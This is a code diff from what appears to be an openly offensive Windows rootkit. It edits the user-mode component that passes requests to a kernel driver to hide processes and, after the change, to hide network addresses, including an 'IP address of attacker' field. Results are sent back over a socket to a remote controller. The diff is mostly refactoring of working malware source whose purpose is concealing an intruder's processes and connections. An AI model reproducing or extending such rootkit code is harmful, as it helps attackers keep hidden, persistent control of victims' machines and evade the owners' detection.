@@ -498,7 +498,7 @@ int DriverCalls::HideProcessKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMO
 	// Pass struct argument to the driver:
 	RootkInst->Unexpected = successful;
 	RootkInst->MdlName = ModuleName;
-	RootkInst->MedPID = (ULONG64)GetCurrentProcessId();;
+	RootkInst->MedPID = (ULONG64)GetCurrentProcessId();
 	DriverResult = CallKernelDriver(ClientToServerSocket, RootkInst, TRUE, PipeHandle, MediumLog);
 	if (!RootkInst->IsFlexible) {
 		RequestHelpers::LogMessage("transformation of regular data from KM-UM confirmed!\n", MediumLog, FALSE, 0);
@@ -520,7 +520,7 @@ int DriverCalls::HideProcessKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMO
 }
 
 
-int DriverCalls::HidePortCommunicationKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog) {
+int DriverCalls::HideNetworkingKernelCall(SOCKET ClientToServerSocket, ROOTKIT_MEMORY* RootkInst, char* ModuleName, HANDLE* PipeHandle, LogFile* MediumLog) {
 	PASS_DATA SocketResult = { 0 };
 	int DriverResult = FALSE;
 	NTSTATUS RequestStatus = STATUS_UNSUCCESSFUL;
@@ -542,15 +542,16 @@ int DriverCalls::HidePortCommunicationKernelCall(SOCKET ClientToServerSocket, RO
 
 
 	// Set important arguments and verify parameters before sending to driver:
-	if (RequestStatus == SHOWHIDDEN_PORTS) {
-		RootkInst->Out = &DummyAddress;  // A real address from medium should be provided for listing processes/ports
+	if (RequestStatus == SHOWHIDDEN_ADDRS) {
+		RootkInst->Out = &DummyAddress;  // A real address from medium should be provided for listing processes/ip addresses
 	}
+	RootkInst->SemiPID = 0;  // Only an actual custom request will update IP address of attacker
 
 
 	// Pass struct argument to the driver:
 	RootkInst->Unexpected = successful;
 	RootkInst->MdlName = ModuleName;
-	RootkInst->MedPID = (ULONG64)GetCurrentProcessId();;
+	RootkInst->MedPID = (ULONG64)GetCurrentProcessId();
 	DriverResult = CallKernelDriver(ClientToServerSocket, RootkInst, TRUE, PipeHandle, MediumLog);
 	if (!RootkInst->IsFlexible) {
 		RequestHelpers::LogMessage("transformation of regular data from KM-UM confirmed!\n", MediumLog, FALSE, 0);
@@ -561,7 +562,7 @@ int DriverCalls::HidePortCommunicationKernelCall(SOCKET ClientToServerSocket, RO
 
 
 	// Parse returned data correctly (after sending back main struct):
-	if ((DriverResult == 0 || DriverResult == 1) && RequestStatus == SHOWHIDDEN_PORTS && RootkInst->Size != 0) {
+	if ((DriverResult == 0 || DriverResult == 1) && RequestStatus == SHOWHIDDEN_ADDRS && RootkInst->Size != 0) {
 		SocketResult = root_internet::SendData(ClientToServerSocket, RootkInst->Out, RootkInst->Size, FALSE, 0, MediumLog);
 		VirtualFree(RootkInst->Out, 0, MEM_RELEASE);  // Release the allocated memory that was injected into by driver
 		if (SocketResult.err || SocketResult.value != RootkInst->Size) {
